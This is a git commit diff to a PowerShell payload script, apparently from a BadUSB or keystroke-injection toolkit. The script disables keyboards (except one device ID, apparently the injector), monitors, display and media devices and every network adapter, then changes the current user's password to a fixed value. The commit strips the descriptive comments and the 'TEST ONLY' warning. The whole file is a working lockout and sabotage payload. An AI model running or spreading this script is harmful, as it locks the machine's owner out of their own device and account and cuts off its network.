d4c7c83adeb8c3d4ca69d05da722d531591f072b
Lingsson <mp.pilback@gmail.com>
2026-07-27 15:02:40 +0200

    Update Disable_device.ps1

--- payloads/system_control/Disable_device.ps1
+++ payloads/system_control/Disable_device.ps1
@@ -1,6 +1,3 @@
-# - Queries connected hardware devices by class (Keyboard, Monitor, Media, Display)
-# - Disables selected device categories using Windows PnP management
-# - Disables network adapters temporarily
 Get-PnpDevice -Class 'Keyboard' | Where-Object {$_.InstanceId -notlike '*239A*'} | Disable-PnpDevice
 Get-PnpDevice -Class 'Monitor' | Disable-PnpDevice
 
@@ -9,7 +6,6 @@ Get-PnpDevice -Class "Media" | Disable-PnpDevice -Confirm:$false
 Get-NetAdapter | Disable-NetAdapter -Confirm:$false
 
 
-# TEST ONLY — modifies local user password.
 net user $env:username NewPassword123
 
 Get-PnpDevice -Class 'Display' | Disable-PnpDevice
